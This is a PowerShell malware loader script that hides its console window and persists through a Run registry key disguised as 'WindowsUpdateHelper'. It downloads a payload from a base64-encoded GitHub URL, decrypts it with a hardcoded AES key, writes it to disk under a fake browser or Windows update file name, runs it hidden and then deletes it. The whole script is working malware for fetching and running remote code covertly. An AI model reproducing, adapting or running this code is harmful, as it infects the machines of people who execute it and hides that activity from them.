<#
ULTIMATE LOADER v48.0 - ENCRYPTED URL
#>

$ErrorActionPreference = 'SilentlyContinue'

# === ENCRYPTED URL (BASE64) ===
$encodedUrl = "aHR0cHM6Ly9naXRodWIuY29tL2V2aWxncm91LXRlY2gvZ3JvdmkvcmF3L3JlZnMvaGVhZHMvbWFpbi9zZXR0aW5ncy5kYXQ="
$url = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($encodedUrl))

# === KEY & IV (from Go script) ===
$key = [byte[]]@(87,105,110,85,112,100,97,116,101,50,48,50,53,83,117,112,101,114,75,101,121,49,50,51,52,53,54,55,56,57,48,49)
$iv = [byte[]]@(87,105,110,85,112,100,97,116,101,73,86,50,48,50,53,33)
$runName = "WindowsUpdateHelper"

# Hide window
Add-Type -Name Window -Namespace Console -MemberDefinition '
[DllImport("Kernel32.dll")] public static extern IntPtr GetConsoleWindow();
[DllImport("User32.dll")] public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
'
[Console.Window]::ShowWindow([Console.Window]::GetConsoleWindow(), 0) | Out-Null

# === CHECK IF RUNNING FROM TEMP ===
$isTemp = $MyInvocation.MyCommand.Path -like "$env:TEMP\*.ps1"

if (-not $isTemp) {
    # FIRST RUN: copy to TEMP and add to startup
    $tempScript = "$env:TEMP\upd_" + [guid]::NewGuid().ToString().Substring(0,8) + ".ps1"
    Copy-Item $MyInvocation.MyCommand.Path $tempScript -Force
    attrib +h $tempScript
    Set-ItemProperty "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name $runName -Value "powershell -NoP -W Hidden -Exec Bypass -File `"$tempScript`"" -Force
    Write-Host "✅ Installed. Will run after reboot." -ForegroundColor Green
    exit
}

# === AFTER REBOOT: download, decrypt, run ===
$wc = New-Object System.Net.WebClient
$data = $wc.DownloadData($url)

$aes = [System.Security.Cryptography.Aes]::Create()
$aes.Key = $key
$aes.IV = $iv
$plain = $aes.CreateDecryptor().TransformFinalBlock($data, 0, $data.Length)

if ($plain[0] -eq 0x4D -and $plain[1] -eq 0x5A) {
    $names = @("chrome_update.exe","edge_update.exe","windows_update.exe","system_update.exe")
    $out = "$env:TEMP\$($names | Get-Random)"
    [IO.File]::WriteAllBytes($out, $plain)
    Start-Process $out -WindowStyle Hidden
    Start-Sleep -Seconds 10
    Remove-Item $out -Force
}